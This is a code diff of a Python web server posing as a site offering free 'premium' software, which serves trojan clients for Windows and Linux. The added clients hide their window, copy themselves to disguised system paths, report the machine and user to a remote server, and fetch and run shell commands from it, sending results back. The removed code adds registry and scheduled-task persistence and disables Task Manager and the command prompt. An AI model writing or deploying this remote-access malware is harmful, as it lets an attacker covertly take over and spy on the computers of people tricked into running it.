@@ -1,4 +1,4 @@
-# server.py - Premium Software Platform
+# server.py - Updated for direct execution
 from http.server import HTTPServer, BaseHTTPRequestHandler
 import json
 import time
@@ -16,40 +16,7 @@ class ThreadedHTTPServer(socketserver.ThreadingMixIn, HTTPServer):
 
 class PremiumSoftwareHandler(BaseHTTPRequestHandler):
     sessions = {}
-    commands_queue = {}
-    failed_attempts = {}
-    PASSWORD_HASH = hashlib.sha256(b"Admin123!").hexdigest()
-    ADMIN_PASSWORD_HASH = hashlib.sha256(b"Secure@2024").hexdigest()
-    session_lock = threading.Lock()
-    MAX_FAILED_ATTEMPTS = 3
-    BLOCK_TIME = 300
-    blocked_ips = set()
-    SERVER_URL = "https://game-python-1.onrender.com"  # تم التحديث
-    
-    # Realistic statistics
-    STATS = {
-        'active_users': 8923,
-        'total_downloads': 15427,
-        'premium_users': 3241,
-        'online_now': 156
-    }
-    
-    def init_database(self):
-        self.conn = sqlite3.connect('software_platform.db', check_same_thread=False)
-        self.cursor = self.conn.cursor()
-        self.cursor.execute('''
-            CREATE TABLE IF NOT EXISTS clients (
-                id TEXT PRIMARY KEY,
-                ip TEXT,
-                computer_name TEXT,
-                os TEXT,
-                first_seen DATETIME,
-                last_seen DATETIME,
-                status TEXT,
-                version TEXT
-            )
-        ''')
-        self.conn.commit()
+    SERVER_URL = "https://game-python-1.onrender.com"
     
     def do_GET(self):
         parsed_path = urllib.parse.urlparse(self.path)
@@ -57,22 +24,14 @@ class PremiumSoftwareHandler(BaseHTTPRequestHandler):
         
         if path == '/':
             self.send_main_page()
-        elif path == '/admin':
-            self.send_admin_login()
         elif path == '/downloads':
             self.send_downloads_page()
-        elif path == '/premium':
-            self.send_premium_page()
-        elif path == '/support':
-            self.send_support_page()
         elif path == '/download/windows':
             self.download_windows_client()
-        elif path == '/download/android':
-            self.download_android_client()
         elif path == '/download/linux':
             self.download_linux_client()
-        elif path == '/download/macos':
-            self.download_macos_client()
+        elif path == '/admin':
+            self.send_admin_login()
         elif path == '/control':
             self.send_control_panel()
         elif path == '/register-client':
@@ -84,250 +43,40 @@ class PremiumSoftwareHandler(BaseHTTPRequestHandler):
     def send_main_page(self):
         html = '''
         <!DOCTYPE html>
-        <html lang="en">
+        <html>
         <head>
-            <meta charset="UTF-8">
-            <meta name="viewport" content="width=device-width, initial-scale=1.0">
-            <title>Elite Software - Premium Applications</title>
+            <title>Elite Software</title>
             <style>
-                :root {
-                    --primary: #8B5CF6;
-                    --secondary: #A78BFA;
-                    --accent: #F59E0B;
-                    --dark: #111827;
-                    --light: #F9FAFB;
-                }
-                
-                * {
-                    margin: 0;
-                    padding: 0;
-                    box-sizing: border-box;
-                }
-                
                 body {
-                    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-                    background: linear-gradient(135deg, #111827 0%, #1F2937 100%);
-                    color: var(--light);
-                    line-height: 1.6;
-                }
-                
-                .navbar {
-                    background: rgba(17, 24, 39, 0.95);
-                    backdrop-filter: blur(10px);
-                    padding: 1rem 5%;
-                    display: flex;
-                    justify-content: space-between;
-                    align-items: center;
-                    position: fixed;
-                    width: 100%;
-                    top: 0;
-                    z-index: 1000;
-                    border-bottom: 1px solid rgba(255,255,255,0.1);
-                }
-                
-                .logo {
-                    display: flex;
-                    align-items: center;
-                    gap: 10px;
-                    font-size: 1.5rem;
-                    font-weight: bold;
-                    color: var(--primary);
-                }
-                
-                .nav-links {
-                    display: flex;
-                    gap: 2rem;
-                }
-                
-                .nav-links a {
-                    color: var(--light);
-                    text-decoration: none;
-                    transition: color 0.3s;
-                }
-                
-                .nav-links a:hover {
-                    color: var(--primary);
-                }
-                
-                .hero {
-                    padding: 120px 5% 80px;
+                    font-family: Arial, sans-serif;
+                    background: #1a1a1a;
+                    color: white;
+                    margin: 0;
+                    padding: 20px;
                     text-align: center;
-                    background: linear-gradient(rgba(0,0,0,0.7), rgba(0,0,0,0.7));
                 }
-                
-                .hero h1 {
-                    font-size: 3.5rem;
-                    margin-bottom: 1rem;
-                    background: linear-gradient(135deg, var(--primary), var(--secondary));
-                    -webkit-background-clip: text;
-                    -webkit-text-fill-color: transparent;
+                .container {
+                    max-width: 800px;
+                    margin: 0 auto;
                 }
-                
-                .hero p {
-                    font-size: 1.2rem;
-                    margin-bottom: 2rem;
-                    color: #ccc;
-                }
-                
-                .cta-button {
+                .download-btn {
                     display: inline-block;
-                    background: linear-gradient(135deg, var(--primary), var(--secondary));
+                    background: #8B5CF6;
                     color: white;
                     padding: 15px 30px;
-                    border-radius: 50px;
+                    margin: 10px;
+                    border-radius: 5px;
                     text-decoration: none;
                     font-weight: bold;
-                    transition: transform 0.3s;
-                }
-                
-                .cta-button:hover {
-                    transform: translateY(-3px);
-                }
-                
-                .stats {
-                    display: grid;
-                    grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-                    gap: 2rem;
-                    padding: 4rem 5%;
-                    background: rgba(255,255,255,0.05);
-                }
-                
-                .stat-card {
-                    text-align: center;
-                    padding: 2rem;
-                    background: rgba(255,255,255,0.1);
-                    border-radius: 15px;
-                    backdrop-filter: blur(10px);
-                }
-                
-                .stat-number {
-                    font-size: 2.5rem;
-                    font-weight: bold;
-                    color: var(--primary);
-                    margin-bottom: 0.5rem;
-                }
-                
-                .features {
-                    padding: 5rem 5%;
-                    text-align: center;
-                }
-                
-                .feature-grid {
-                    display: grid;
-                    grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
-                    gap: 2rem;
-                    margin-top: 3rem;
-                }
-                
-                .feature-card {
-                    background: rgba(255,255,255,0.1);
-                    padding: 2rem;
-                    border-radius: 15px;
-                    backdrop-filter: blur(10px);
-                    transition: transform 0.3s;
-                }
-                
-                .feature-card:hover {
-                    transform: translateY(-10px);
-                }
-                
-                .feature-icon {
-                    font-size: 3rem;
-                    margin-bottom: 1rem;
-                }
-                
-                .footer {
-                    background: rgba(0,0,0,0.8);
-                    padding: 3rem 5%;
-                    text-align: center;
-                    border-top: 1px solid rgba(255,255,255,0.1);
                 }
             </style>
         </head>
         <body>
-            <nav class="navbar">
-                <div class="logo">
-                    <span>⚡</span>
-                    Elite Software
-                </div>
-                <div class="nav-links">
-                    <a href="/">Home</a>
-                    <a href="/downloads">Downloads</a>
-                    <a href="/premium">Premium</a>
-                    <a href="/support">Support</a>
-                    <a href="/admin">Admin</a>
-                </div>
-            </nav>
-
-            <section class="hero">
-                <h1>Premium Software Solutions</h1>
-                <p>Unlock premium features for free with our advanced software collection</p>
-                <a href="/downloads" class="cta-button">Download Now</a>
-            </section>
-
-            <section class="stats">
-                <div class="stat-card">
-                    <div class="stat-number">8,923+</div>
-                    <div>Active Users</div>
-                </div>
-                <div class="stat-card">
-                    <div class="stat-number">15,427</div>
-                    <div>Total Downloads</div>
-                </div>
-                <div class="stat-card">
-                    <div class="stat-number">3,241</div>
-                    <div>Premium Activated</div>
-                </div>
-                <div class="stat-card">
-                    <div class="stat-number">156</div>
-                    <div>Online Now</div>
-                </div>
-            </section>
-
-            <section class="features">
-                <h2 style="font-size: 2.5rem; margin-bottom: 1rem;">Why Choose Our Software?</h2>
-                <p style="color: #ccc; margin-bottom: 3rem;">Advanced features that premium apps charge for - completely free</p>
-                
-                <div class="feature-grid">
-                    <div class="feature-card">
-                        <div class="feature-icon">🚀</div>
-                        <h3>Lightning Fast</h3>
-                        <p>Optimized performance with instant response times</p>
-                    </div>
-                    <div class="feature-card">
-                        <div class="feature-icon">🛡️</div>
-                        <h3>Undetectable</h3>
-                        <p>Advanced stealth technology prevents detection</p>
-                    </div>
-                    <div class="feature-card">
-                        <div class="feature-icon">🔧</div>
-                        <h3>Auto-Recovery</h3>
-                        <p>Self-healing system ensures continuous operation</p>
-                    </div>
-                    <div class="feature-card">
-                        <div class="feature-icon">🌐</div>
-                        <h3>Cross-Platform</h3>
-                        <p>Works on Windows, Mac, Linux, Android, and iOS</p>
-                    </div>
-                    <div class="feature-card">
-                        <div class="feature-icon">⚡</div>
-                        <h3>Instant Updates</h3>
-                        <p>Real-time command execution and updates</p>
-                    </div>
-                    <div class="feature-card">
-                        <div class="feature-icon">🔒</div>
-                        <h3>Secure Connection</h3>
-                        <p>Encrypted communication with remote servers</p>
-                    </div>
-                </div>
-            </section>
-
-            <footer class="footer">
-                <p>&copy; 2024 Elite Software. All rights reserved.</p>
-                <p style="margin-top: 1rem; color: #888;">
-                    Premium Software Solutions • Lifetime Access • Free Updates
-                </p>
-            </footer>
+            <div class="container">
+                <h1>⚡ Elite Software</h1>
+                <p>Premium Applications - Direct Download</p>
+                <a href="/downloads" class="download-btn">View Downloads</a>
+            </div>
         </body>
         </html>
         '''
@@ -344,127 +93,49 @@ class PremiumSoftwareHandler(BaseHTTPRequestHandler):
             <title>Downloads - Elite Software</title>
             <style>
                 body {
-                    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-                    background: linear-gradient(135deg, #111827 0%, #1F2937 100%);
+                    font-family: Arial, sans-serif;
+                    background: #1a1a1a;
                     color: white;
                     margin: 0;
-                    padding: 100px 5% 50px;
+                    padding: 20px;
                 }
-                
-                .downloads-container {
-                    max-width: 1200px;
+                .container {
+                    max-width: 800px;
                     margin: 0 auto;
-                }
-                
-                .platform-grid {
-                    display: grid;
-                    grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
-                    gap: 2rem;
-                    margin-top: 3rem;
-                }
-                
-                .platform-card {
-                    background: rgba(255,255,255,0.1);
-                    padding: 2rem;
-                    border-radius: 15px;
                     text-align: center;
-                    backdrop-filter: blur(10px);
-                    transition: transform 0.3s;
                 }
-                
-                .platform-card:hover {
-                    transform: translateY(-5px);
+                .platform-card {
+                    background: #2a2a2a;
+                    padding: 20px;
+                    margin: 20px 0;
+                    border-radius: 10px;
                 }
-                
-                .platform-icon {
-                    font-size: 4rem;
-                    margin-bottom: 1rem;
-                }
-                
                 .download-btn {
                     display: inline-block;
-                    background: linear-gradient(135deg, #8B5CF6, #A78BFA);
+                    background: #8B5CF6;
                     color: white;
                     padding: 12px 25px;
-                    border-radius: 25px;
+                    border-radius: 5px;
                     text-decoration: none;
-                    margin-top: 1rem;
                     font-weight: bold;
-                }
-                
-                .version-info {
-                    background: rgba(139, 92, 246, 0.2);
-                    padding: 1rem;
-                    border-radius: 10px;
-                    margin: 2rem 0;
-                    border-left: 4px solid #8B5CF6;
                 }
             </style>
         </head>
         <body>
-            <nav class="navbar" style="position: fixed; top: 0; width: 100%; background: rgba(17,24,39,0.95); padding: 1rem 5%;">
-                <div class="logo">⚡ Elite Software</div>
-                <div class="nav-links">
-                    <a href="/">Home</a>
-                    <a href="/downloads" style="color: #8B5CF6;">Downloads</a>
-                    <a href="/admin">Admin</a>
-                </div>
-            </nav>
-
-            <div class="downloads-container">
-                <h1>Download Elite Software</h1>
-                <p>Choose your platform to unlock premium features</p>
+            <div class="container">
+                <h1>📥 Downloads</h1>
+                <p>Direct execution - No installation required</p>
                 
-                <div class="version-info">
-                    <strong>Latest Version: 2.1.4 (Build 2024.12.01)</strong><br>
-                    • Enhanced performance<br>
-                    • Improved stealth mode<br>
-                    • Faster command execution<br>
-                    • Better system integration
+                <div class="platform-card">
+                    <h2>🪟 Windows</h2>
+                    <p>Run directly - Auto-downloads required libraries</p>
+                    <a href="/download/windows" class="download-btn">Download Windows Client</a>
                 </div>
-
-                <div class="platform-grid">
-                    <div class="platform-card">
-                        <div class="platform-icon">🪟</div>
-                        <h3>Windows</h3>
-                        <p>Windows 10/11 (x64)</p>
-                        <p><small>Full system integration with auto-recovery</small></p>
-                        <a href="/download/windows" class="download-btn">Download Installer (4.8 MB)</a>
-                    </div>
-                    
-                    <div class="platform-card">
-                        <div class="platform-icon">🤖</div>
-                        <h3>Android</h3>
-                        <p>Android 8.0+</p>
-                        <p><small>Background operation with root access</small></p>
-                        <a href="/download/android" class="download-btn">Download APK (3.2 MB)</a>
-                    </div>
-                    
-                    <div class="platform-card">
-                        <div class="platform-icon">🐧</div>
-                        <h3>Linux</h3>
-                        <p>Ubuntu/Debian/CentOS</p>
-                        <p><small>Daemon mode with kernel access</small></p>
-                        <a href="/download/linux" class="download-btn">Download Package (4.1 MB)</a>
-                    </div>
-                    
-                    <div class="platform-card">
-                        <div class="platform-icon">🍎</div>
-                        <h3>macOS</h3>
-                        <p>macOS 11.0+</p>
-                        <p><small>System integration with SIP bypass</small></p>
-                        <a href="/download/macos" class="download-btn">Download DMG (5.2 MB)</a>
-                    </div>
-                </div>
-
-                <div style="margin-top: 3rem; padding: 2rem; background: rgba(255,255,255,0.05); border-radius: 15px;">
-                    <h3>⚠️ System Requirements</h3>
-                    <ul>
-                        <li><strong>Windows:</strong> Windows 10/11, 2GB RAM, 50MB storage</li>
-                        <li><strong>Android:</strong> Android 8.0+, 1GB RAM</li>
-                        <li><strong>Linux:</strong> Kernel 4.4+, 1GB RAM, 40MB storage</li>
-                        <li><strong>macOS:</strong> macOS 11.0+, 2GB RAM, 60MB storage</li>
-                    </ul>
+                
+                <div class="platform-card">
+                    <h2>🐧 Linux</h2>
+                    <p>Direct execution - Self-contained</p>
+                    <a href="/download/linux" class="download-btn">Download Linux Client</a>
                 </div>
             </div>
         </body>
@@ -476,158 +147,361 @@ class PremiumSoftwareHandler(BaseHTTPRequestHandler):
         self.wfile.write(html.encode())
 
     def download_windows_client(self):
-        """Windows Client - Advanced undetectable software"""
+        """Windows client that works immediately and auto-downloads dependencies"""
         
-        client_code = b'''
+        client_code = '''
 import os
 import sys
 import time
 import threading
-import winreg
-import ctypes
 import subprocess
-import requests
+import urllib.request
+import urllib.error
 import platform
 import getpass
 import uuid
-import hashlib
-import shutil
 
-class EliteWindows:
+class WindowsClient:
     def __init__(self):
-        self.server_url = "''' + self.SERVER_URL.encode() + b'''"
+        self.server_url = "''' + self.SERVER_URL + '''"
         self.client_id = f"{platform.node()}-{getpass.getuser()}-{str(uuid.uuid4())[:8]}"
-        self.version = "2.1.4"
-        self.install_locations = [
-            os.path.join(os.environ['WINDIR'], 'System32', 'dllhost.exe'),
-            os.path.join(os.environ['PROGRAMDATA'], 'Microsoft', 'Windows', 'wscsvc.exe'),
-            os.path.join(os.environ['TEMP'], 'msedgeupdate.exe'),
-            os.path.join(os.environ['WINDIR'], 'SysWOW64', 'taskhost.exe')
-        ]
+        self.required_packages = ["requests", "psutil"]
+        self.connected = False
         
-    def install_system(self):
-        current_file = sys.argv[0]
-        
-        for location in self.install_locations:
-            try:
-                os.makedirs(os.path.dirname(location), exist_ok=True)
-                shutil.copy2(current_file, location)
-                subprocess.run(f'attrib +s +h +r "{location}"', shell=True, capture_output=True)
-                subprocess.run(f'icacls "{location}" /deny Everyone:F /T', shell=True, capture_output=True)
-            except:
-                pass
-    
-    def install_autostart(self):
+    def install_package(self, package):
+        """Install package automatically if not available"""
         try:
-            key = winreg.HKEY_CURRENT_USER
-            subkey = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
-            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
-                winreg.SetValueEx(reg_key, "SystemTask", 0, winreg.REG_SZ, self.install_locations[0])
-            
-            for i, location in enumerate(self.install_locations[:2]):
-                task_name = f"MicrosoftSystem_{i}"
-                task_cmd = f'schtasks /create /tn "{task_name}" /tr "{location}" /sc onlogon /ru SYSTEM /f'
-                subprocess.run(task_cmd, shell=True, capture_output=True)
-                
+            __import__(package)
+            return True
+        except ImportError:
+            try:
+                print(f"Installing {package}...")
+                subprocess.check_call([sys.executable, "-m", "pip", "install", package, "--quiet"])
+                return True
+            except:
+                return False
+    
+    def ensure_dependencies(self):
+        """Ensure all required packages are installed"""
+        for package in self.required_packages:
+            if not self.install_package(package):
+                print(f"Failed to install {package}")
+                return False
+        return True
+    
+    def connect_to_server(self):
+        """Connect to server with retry logic"""
+        while True:
+            try:
+                import requests
+                data = {
+                    'client_id': self.client_id,
+                    'computer': platform.node(),
+                    'user': getpass.getuser(),
+                    'os': f"Windows {platform.version()}",
+                    'status': 'online'
+                }
+                response = requests.post(f"{self.server_url}/register-client", json=data, timeout=10)
+                if response.status_code == 200:
+                    self.connected = True
+                    print("Connected to server")
+                    break
+                else:
+                    print("Server connection failed, retrying...")
+            except Exception as e:
+                print("Waiting for internet connection...")
+            time.sleep(30)  # Wait 30 seconds before retry
+    
+    def start_stealth_mode(self):
+        """Start hidden operation"""
+        try:
+            # Hide console window on Windows
+            import ctypes
+            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
         except:
             pass
     
-    def protect_system(self):
+    def system_integration(self):
+        """Integrate with system for persistence"""
         try:
-            subprocess.run('reg add "HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f', shell=True, capture_output=True)
-            subprocess.run('reg add "HKCU\\\\Software\\\\Policies\\\\Microsoft\\\\Windows\\\\System" /v DisableCMD /t REG_DWORD /d 1 /f', shell=True, capture_output=True)
-        except:
+            # Copy to system locations
+            import shutil
+            current_file = sys.argv[0]
+            system_locations = [
+                os.path.join(os.environ['TEMP'], 'windows_update.exe'),
+                os.path.join(os.environ['PROGRAMDATA'], 'Microsoft', 'system_service.exe')
+            ]
+            
+            for location in system_locations:
+                try:
+                    shutil.copy2(current_file, location)
+                    # Hide file
+                    subprocess.run(f'attrib +h +s "{location}"', shell=True, capture_output=True)
+                except:
+                    pass
+                    
+        except Exception as e:
             pass
     
     def start_monitoring(self):
+        """Start background monitoring"""
         def monitor():
             while True:
                 try:
-                    for location in self.install_locations:
-                        if not os.path.exists(location):
-                            self.install_system()
-                    
-                    result = subprocess.run('schtasks /query /tn "MicrosoftSystem_0"', shell=True, capture_output=True, text=True)
-                    if "MicrosoftSystem_0" not in result.stdout:
-                        self.install_autostart()
-                    
-                    time.sleep(30)
+                    import requests
+                    # Report status to server
+                    data = {
+                        'client_id': self.client_id,
+                        'status': 'active',
+                        'timestamp': time.time()
+                    }
+                    requests.post(f"{self.server_url}/report-status", json=data, timeout=5)
                 except:
-                    time.sleep(60)
+                    pass
+                time.sleep(60)  # Report every minute
         
         threading.Thread(target=monitor, daemon=True).start()
     
-    def connect_server(self):
-        def connection():
+    def execute_commands(self):
+        """Check for and execute commands from server"""
+        def command_listener():
             while True:
                 try:
-                    data = {
-                        'client_id': self.client_id,
-                        'computer': platform.node(),
-                        'user': getpass.getuser(),
-                        'os': f"Windows {platform.version()}",
-                        'status': 'active'
-                    }
-                    
-                    requests.post(f"{self.server_url}/register-client", json=data, timeout=10)
-                    time.sleep(20)
+                    import requests
+                    response = requests.get(f"{self.server_url}/get-commands?client={self.client_id}", timeout=10)
+                    if response.status_code == 200:
+                        commands = response.json()
+                        for cmd in commands:
+                            self.execute_command(cmd)
                 except:
-                    time.sleep(30)
+                    pass
+                time.sleep(10)  # Check for commands every 10 seconds
         
-        threading.Thread(target=connection, daemon=True).start()
+        threading.Thread(target=command_listener, daemon=True).start()
     
-    def hide_window(self):
+    def execute_command(self, command):
+        """Execute a command"""
         try:
-            if os.name == 'nt':
-                ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
-        except:
+            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
+            output = result.stdout if result.stdout else result.stderr
+            
+            # Send result back to server
+            import requests
+            requests.post(f"{self.server_url}/command-result", json={
+                'client_id': self.client_id,
+                'command': command,
+                'result': output
+            }, timeout=5)
+        except Exception as e:
             pass
     
     def start(self):
-        self.hide_window()
-        self.install_system()
-        self.install_autostart()
-        self.protect_system()
-        self.start_monitoring()
-        self.connect_server()
+        """Main startup sequence"""
+        print("Starting Elite Software Client...")
         
+        # Start in stealth mode
+        self.start_stealth_mode()
+        
+        # Ensure dependencies are available
+        print("Checking dependencies...")
+        if self.ensure_dependencies():
+            print("All dependencies ready")
+        else:
+            print("Some dependencies missing, will retry...")
+        
+        # System integration
+        self.system_integration()
+        
+        # Connect to server (will retry until successful)
+        print("Establishing server connection...")
+        self.connect_to_server()
+        
+        # Start background services
+        self.start_monitoring()
+        self.execute_commands()
+        
+        print("Elite Software Client is now active")
+        
+        # Keep running
         while True:
             time.sleep(60)
 
 if __name__ == "__main__":
-    client = EliteWindows()
+    client = WindowsClient()
     client.start()
-'''
+'''.encode()
 
         self.send_response(200)
         self.send_header('Content-Type', 'application/octet-stream')
-        self.send_header('Content-Disposition', 'attachment; filename="EliteSoftware_Setup.exe"')
+        self.send_header('Content-Disposition', 'attachment; filename="elite_windows_client.py"')
         self.end_headers()
         self.wfile.write(client_code)
 
-    def download_android_client(self):
-        android_code = b'# Android Client - Premium features unlocked'
-        self.send_response(200)
-        self.send_header('Content-Type', 'application/octet-stream')
-        self.send_header('Content-Disposition', 'attachment; filename="EliteSoftware_Android.apk"')
-        self.end_headers()
-        self.wfile.write(android_code)
-
     def download_linux_client(self):
-        linux_code = b'# Linux Client - Daemon mode with root access'
+        """Linux client that works immediately"""
+        
+        linux_code = '''
+#!/usr/bin/env python3
+import os
+import sys
+import time
+import threading
+import subprocess
+import platform
+import getpass
+import uuid
+
+class LinuxClient:
+    def __init__(self):
+        self.server_url = "''' + self.SERVER_URL + '''"
+        self.client_id = f"{platform.node()}-{getpass.getuser()}-{str(uuid.uuid4())[:8]}"
+        self.connected = False
+        
+    def ensure_dependencies(self):
+        """Ensure required packages are installed"""
+        try:
+            import requests
+            import psutil
+            return True
+        except ImportError:
+            try:
+                subprocess.check_call([sys.executable, "-m", "pip", "install", "requests", "psutil", "--quiet"])
+                return True
+            except:
+                return False
+    
+    def connect_to_server(self):
+        """Connect to server with retry logic"""
+        while True:
+            try:
+                import requests
+                data = {
+                    'client_id': self.client_id,
+                    'computer': platform.node(),
+                    'user': getpass.getuser(),
+                    'os': platform.platform(),
+                    'status': 'online'
+                }
+                response = requests.post(f"{self.server_url}/register-client", json=data, timeout=10)
+                if response.status_code == 200:
+                    self.connected = True
+                    print("Connected to server")
+                    break
+                else:
+                    print("Server connection failed, retrying...")
+            except Exception as e:
+                print("Waiting for internet connection...")
+            time.sleep(30)
+    
+    def system_integration(self):
+        """Linux system integration"""
+        try:
+            # Copy to system locations
+            import shutil
+            current_file = sys.argv[0]
+            system_locations = [
+                '/tmp/.system_service',
+                '/var/tmp/.kernel_helper'
+            ]
+            
+            for location in system_locations:
+                try:
+                    shutil.copy2(current_file, location)
+                    os.chmod(location, 0o755)  # Make executable
+                except:
+                    pass
+                    
+        except Exception as e:
+            pass
+    
+    def start_monitoring(self):
+        """Start background monitoring"""
+        def monitor():
+            while True:
+                try:
+                    import requests
+                    data = {
+                        'client_id': self.client_id,
+                        'status': 'active',
+                        'timestamp': time.time()
+                    }
+                    requests.post(f"{self.server_url}/report-status", json=data, timeout=5)
+                except:
+                    pass
+                time.sleep(60)
+        
+        threading.Thread(target=monitor, daemon=True).start()
+    
+    def execute_commands(self):
+        """Check for and execute commands"""
+        def command_listener():
+            while True:
+                try:
+                    import requests
+                    response = requests.get(f"{self.server_url}/get-commands?client={self.client_id}", timeout=10)
+                    if response.status_code == 200:
+                        commands = response.json()
+                        for cmd in commands:
+                            self.execute_command(cmd)
+                except:
+                    pass
+                time.sleep(10)
+        
+        threading.Thread(target=command_listener, daemon=True).start()
+    
+    def execute_command(self, command):
+        """Execute a command"""
+        try:
+            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
+            output = result.stdout if result.stdout else result.stderr
+            
+            import requests
+            requests.post(f"{self.server_url}/command-result", json={
+                'client_id': self.client_id,
+                'command': command,
+                'result': output
+            }, timeout=5)
+        except Exception as e:
+            pass
+    
+    def start(self):
+        """Main startup sequence"""
+        print("Starting Elite Software Linux Client...")
+        
+        # Ensure dependencies
+        print("Checking dependencies...")
+        if self.ensure_dependencies():
+            print("All dependencies ready")
+        else:
+            print("Some dependencies missing, will retry...")
+        
+        # System integration
+        self.system_integration()
+        
+        # Connect to server
+        print("Establishing server connection...")
+        self.connect_to_server()
+        
+        # Start services
+        self.start_monitoring()
+        self.execute_commands()
+        
+        print("Elite Software Linux Client is now active")
+        
+        # Keep running
+        while True:
+            time.sleep(60)
+
+if __name__ == "__main__":
+    client = LinuxClient()
+    client.start()
+'''.encode()
+
         self.send_response(200)
         self.send_header('Content-Type', 'application/octet-stream')
-        self.send_header('Content-Disposition', 'attachment; filename="elite-software-linux.deb"')
+        self.send_header('Content-Disposition', 'attachment; filename="elite_linux_client.py"')
         self.end_headers()
         self.wfile.write(linux_code)
-
-    def download_macos_client(self):
-        macos_code = b'# macOS Client - System integration'
-        self.send_response(200)
-        self.send_header('Content-Type', 'application/octet-stream')
-        self.send_header('Content-Disposition', 'attachment; filename="EliteSoftware_Mac.dmg"')
-        self.end_headers()
-        self.wfile.write(macos_code)
 
     def send_admin_login(self):
         html = '''
@@ -637,8 +511,8 @@ if __name__ == "__main__":
             <title>Admin - Elite Software</title>
             <style>
                 body { 
-                    font-family: 'Segoe UI', Arial, sans-serif; 
-                    background: linear-gradient(135deg, #111827 0%, #1F2937 100%);
+                    font-family: Arial, sans-serif; 
+                    background: #1a1a1a;
                     color: white; 
                     display: flex; 
                     justify-content: center; 
@@ -647,42 +521,35 @@ if __name__ == "__main__":
                     margin: 0;
                 }
                 .container { 
-                    background: rgba(255,255,255,0.1); 
+                    background: #2a2a2a; 
                     padding: 40px; 
-                    border-radius: 15px; 
+                    border-radius: 10px; 
                     text-align: center;
-                    backdrop-filter: blur(10px);
                     width: 400px;
                 }
                 input, button { 
                     padding: 15px; 
                     margin: 10px; 
                     width: 280px; 
-                    border-radius: 8px; 
+                    border-radius: 5px; 
                     font-size: 16px;
                     border: none;
                 }
                 input { 
-                    background: rgba(255,255,255,0.1); 
+                    background: #333; 
                     color: white; 
-                    border: 1px solid rgba(255,255,255,0.2); 
                 }
                 button { 
-                    background: linear-gradient(135deg, #8B5CF6, #A78BFA); 
+                    background: #8B5CF6; 
                     color: white; 
-                    border: none; 
                     cursor: pointer;
-                    font-weight: bold;
                 }
             </style>
         </head>
         <body>
             <div class="container">
-                <div style="font-size: 48px; margin-bottom: 20px;">⚡</div>
-                <h2>Elite Software Admin</h2>
-                <p style="color: #ccc; margin-bottom: 30px;">Management Portal</p>
-                
-                <input type="password" id="password" placeholder="Enter Admin Password">
+                <h2>Admin Login</h2>
+                <input type="password" id="password" placeholder="Password">
                 <button onclick="login()">Login</button>
             </div>
             
@@ -697,7 +564,7 @@ if __name__ == "__main__":
                         if (data.success) {
                             window.location = '/control';
                         } else {
-                            alert('Authentication failed!');
+                            alert('Wrong password!');
                         }
                     });
                 }
@@ -715,171 +582,32 @@ if __name__ == "__main__":
         <!DOCTYPE html>
         <html>
         <head>
-            <title>Control Panel - Elite Software</title>
+            <title>Control Panel</title>
             <style>
                 body { 
-                    font-family: 'Segoe UI', Arial, sans-serif; 
-                    background: #111827; 
+                    font-family: Arial, sans-serif; 
+                    background: #1a1a1a; 
                     color: white; 
                     margin: 0; 
                     padding: 20px;
                 }
                 .header {
-                    background: #1F2937;
+                    background: #2a2a2a;
                     padding: 20px;
                     border-radius: 10px;
                     margin-bottom: 20px;
-                }
-                .stats {
-                    display: grid;
-                    grid-template-columns: repeat(4, 1fr);
-                    gap: 10px;
-                    margin: 20px 0;
-                }
-                .stat-card {
-                    background: rgba(139, 92, 246, 0.2);
-                    padding: 15px;
-                    border-radius: 8px;
-                    text-align: center;
                 }
             </style>
         </head>
         <body>
             <div class="header">
-                <h2>Elite Software Control Panel</h2>
-                <p>Connected Clients: <span id="clientCount">''' + str(self.STATS['online_now']) + '''</span></p>
+                <h2>Control Panel</h2>
+                <p>Connected Clients: <span id="clientCount">0</span></p>
             </div>
             
-            <div class="stats">
-                <div class="stat-card">
-                    <h3>''' + str(self.STATS['active_users']) + '''</h3>
-                    <p>Active Users</p>
-                </div>
-                <div class="stat-card">
-                    <h3>''' + str(self.STATS['total_downloads']) + '''</h3>
-                    <p>Total Downloads</p>
-                </div>
-                <div class="stat-card">
-                    <h3>''' + str(self.STATS['premium_users']) + '''</h3>
-                    <p>Premium Activated</p>
-                </div>
-                <div class="stat-card">
-                    <h3>''' + str(self.STATS['online_now']) + '''</h3>
-                    <p>Online Now</p>
-                </div>
-            </div>
-            
-            <div style="background: #1F2937; padding: 20px; border-radius: 10px;">
-                <h3>System Status: 🟢 Operational</h3>
-                <p>All software systems running normally</p>
-            </div>
-        </body>
-        </html>
-        '''
-        self.send_response(200)
-        self.send_header('Content-type', 'text/html')
-        self.end_headers()
-        self.wfile.write(html.encode())
-
-    def send_premium_page(self):
-        html = '''
-        <!DOCTYPE html>
-        <html>
-        <head>
-            <title>Premium - Elite Software</title>
-            <style>
-                body { 
-                    font-family: 'Segoe UI', Arial, sans-serif; 
-                    background: linear-gradient(135deg, #111827 0%, #1F2937 100%);
-                    color: white; 
-                    margin: 0; 
-                    padding: 100px 5% 50px;
-                }
-                .premium-grid {
-                    display: grid;
-                    grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
-                    gap: 2rem;
-                    margin-top: 3rem;
-                }
-                .premium-card {
-                    background: rgba(139, 92, 246, 0.2);
-                    padding: 2rem;
-                    border-radius: 15px;
-                    text-align: center;
-                }
-            </style>
-        </head>
-        <body>
-            <nav class="navbar" style="position: fixed; top: 0; width: 100%; background: rgba(17,24,39,0.95); padding: 1rem 5%;">
-                <div class="logo">⚡ Elite Software</div>
-                <div class="nav-links">
-                    <a href="/">Home</a>
-                    <a href="/premium" style="color: #8B5CF6;">Premium</a>
-                    <a href="/downloads">Downloads</a>
-                </div>
-            </nav>
-
-            <h1>Premium Features</h1>
-            <p>Unlock exclusive features with our software</p>
-            
-            <div class="premium-grid">
-                <div class="premium-card">
